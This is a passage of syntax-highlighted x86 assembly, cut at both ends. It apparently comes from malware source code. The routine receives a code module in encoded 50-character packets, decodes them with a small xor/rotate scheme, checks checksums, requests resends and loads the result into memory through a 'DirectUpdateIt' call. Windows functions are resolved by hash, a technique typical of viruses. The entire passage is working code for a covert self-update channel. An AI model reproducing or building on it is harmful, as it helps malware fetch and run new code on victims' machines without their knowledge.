</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; check that the edx = 0</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">skipgetbuffer</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">4</span><span class="sc0">                               </span><span class="sc1">; PAGE_READWRITE</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">1000h</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc5">modulesize</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">0</span><span class="sc0">   
</span><span class="sc5">C_apicall</span><span class="sc0">       </span><span class="sc2">0A2F83D2Ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; VirtualAlloc</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; set memory allocating</span><span class="sc0">

</span><span class="sc5">skipgetbuffer</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; get dword at esi+1</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">hex2val</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">50</span><span class="sc0">                  </span><span class="sc1">; calculate pos in buffer</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">; multiply it</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; load destination buffer</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; esi equal position in the </span><span class="sc0">
                        </span><span class="sc1">; buffer</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">50</span><span class="sc0">                  </span><span class="sc1">; drop 50 characters</span><span class="sc0">

</span><span class="sc5">copythatnow</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; load the ascii</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ascii2hex</span><span class="sc0">               </span><span class="sc1">; set it to minus caracter</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">66</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">           </span><span class="sc1">; drop to buffer the caracter</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">copythatnow</span><span class="sc0">             </span><span class="sc1">; copy all the buffer</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; load the checksum</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ascii2hex</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                   </span><span class="sc1">; translate it to byte</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; eax will receive the crc</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">50</span><span class="sc0">                  </span><span class="sc1">; </span><span class="sc0">

</span><span class="sc5">copythatnow2</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; load each byte</span><span class="sc0">
</span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">copythatnow2</span><span class="sc0">                </span><span class="sc1">; dumb little checksum I know</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; check if the crc are </span><span class="sc0">
                        </span><span class="sc1">; similar, if so, no prob</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">                   
</span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">noproblem99</span><span class="sc0">             </span><span class="sc1">; if crc different, then </span><span class="sc0">
                        </span><span class="sc1">; resend it</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">                   </span><span class="sc1">; load small amount of memory</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">                 </span><span class="sc1">; </span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc12">'7'</span><span class="sc0">          </span><span class="sc1">; set resend_packet</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">minisendit</span><span class="sc0">

</span><span class="sc5">noproblem99</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">                   </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">                 </span><span class="sc1">; </span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc12">'6'</span><span class="sc0">          </span><span class="sc1">; set send_next_packet</span><span class="sc0">

</span><span class="sc5">minisendit</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">           </span><span class="sc1">; set current packet</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">directinput</span><span class="sc0">             </span><span class="sc1">; send it directly</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">

</span><span class="sc5">returnlayer5</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'6'</span><span class="sc0">          </span><span class="sc1">; check if received message </span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">returnlayer6</span><span class="sc0">                </span><span class="sc1">; is 6</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; load send next message</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">hex2val</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">pushad</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">50</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">; calculate next pointer</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">uploadinput</span><span class="sc4">,</span><span class="sc5">rl55</span><span class="sc0">        </span><span class="sc1">; load current uploading</span><span class="sc0">
</span><span class="sc6">movzx</span><span class="sc0">       </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; </span><span class="sc0">

</span><span class="sc5">CSyscall</span><span class="sc0">    </span><span class="sc5">getmodpointer</span><span class="sc0">           </span><span class="sc1">; load the module pointer</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; load module size</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">50</span><span class="sc0">              </span><span class="sc1">; get next</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; cmp if next packet </span><span class="sc0">
                        </span><span class="sc1">; overrun</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">skipdithis</span><span class="sc0">

</span><span class="sc1">;int        3               ; yes ? </span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; load this packet size</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">               </span><span class="sc1">; minus 4</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">getthatitit</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; load byte</span><span class="sc0">
</span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">loop</span><span class="sc0">        </span><span class="sc5">getthatitit</span><span class="sc0">         </span><span class="sc1">; check all of it</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc12">'8'</span><span class="sc0">      </span><span class="sc1">; set crc check mark</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">getthatitit2</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">hex2ascii</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; save hex char</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">

</span><span class="sc6">loop</span><span class="sc0">        </span><span class="sc5">getthatitit2</span><span class="sc0">            </span><span class="sc1">; print the 4 char</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">directinput</span><span class="sc0">         </span><span class="sc1">; send the mark-crc</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">

</span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">                     </span><span class="sc1">; finished</span><span class="sc0">

</span><span class="sc5">skipdithis</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">popad</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">sendpacket</span><span class="sc0">          </span><span class="sc1">; send next packet</span><span class="sc0">

</span><span class="sc5">returnlayer6</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'7'</span><span class="sc0">      </span><span class="sc1">; check resend packet</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">returnlayer7</span><span class="sc0">
    
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; load next packet</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">hex2val</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">sendpacket</span><span class="sc0">          </span><span class="sc1">; send it!</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">returnlayer7</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'8'</span><span class="sc0">      </span><span class="sc1">; check </span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">returnlayer8</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">               </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc5">getlayer8</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; convert from buffer</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">ascii2hex</span><span class="sc0">           </span><span class="sc1">; into char</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">

</span><span class="sc6">loop</span><span class="sc0">        </span><span class="sc5">getlayer8</span><span class="sc0">           </span><span class="sc1">; get the 8 bytes of the Crc</span><span class="sc0">

</span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">destbuffer</span><span class="sc4">,</span><span class="sc5">lc1</span><span class="sc0">      </span><span class="sc1">; load the module in mem</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; save it there</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; nullify eax</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc5">getthatitit5</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; get the crc of the module</span><span class="sc0">
</span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">               </span><span class="sc1">; in the buffer</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">loop</span><span class="sc0">        </span><span class="sc5">getthatitit5</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">         
    
</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                 </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">mindbond</span><span class="sc0">                </span><span class="sc1">; transfer error ?</span><span class="sc0">

</span><span class="sc1">; here we load it, but we be coded later, normally it's a direct flush into</span><span class="sc0">
</span><span class="sc1">; the module areas</span><span class="sc0">

</span><span class="sc1">;int        3</span><span class="sc0">

</span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">destbuffer</span><span class="sc4">,</span><span class="sc5">lpp273</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">uploadinput</span><span class="sc4">,</span><span class="sc5">lpp276</span><span class="sc0">
</span><span class="sc6">movzx</span><span class="sc0">       </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">CSyscall</span><span class="sc0">    </span><span class="sc5">DirectUpdateIt</span><span class="sc0">

</span><span class="sc5">mindbond</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;call       layer5uninit</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc12">'1'</span><span class="sc0">                  </span><span class="sc1">; restart transfer</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">minisend</span><span class="sc0">                </span><span class="sc1">; procedure</span><span class="sc0">

</span><span class="sc5">returnlayer8</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">sendpacket</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc6">pushad</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">250</span><span class="sc0">
</span><span class="sc5">C_apicall</span><span class="sc0">   </span><span class="sc2">3126C0h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc6">popad</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">107</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">'5'</span><span class="sc0">          </span><span class="sc1">; set data packet</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                 </span><span class="sc1">; nullify ebx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                   </span><span class="sc1">; drop four char</span><span class="sc0">
                        </span><span class="sc1">; from the number of packet</span><span class="sc0">
</span><span class="sc5">gen_doitagain</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">; div by 8 hexa number</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">                   </span><span class="sc1">; got a number between 0-9</span><span class="sc0">
</span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                   </span><span class="sc1">; and sotre it into a reg</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">gen_doitagain</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc12">'0000'</span><span class="sc0">              </span><span class="sc1">; load it as number</span><span class="sc0">

</span><span class="sc1">;xchg   bh,bl</span><span class="sc0">
</span><span class="sc1">;ror    ebx,16</span><span class="sc0">
</span><span class="sc1">;xchg   bh,bl</span><span class="sc0">

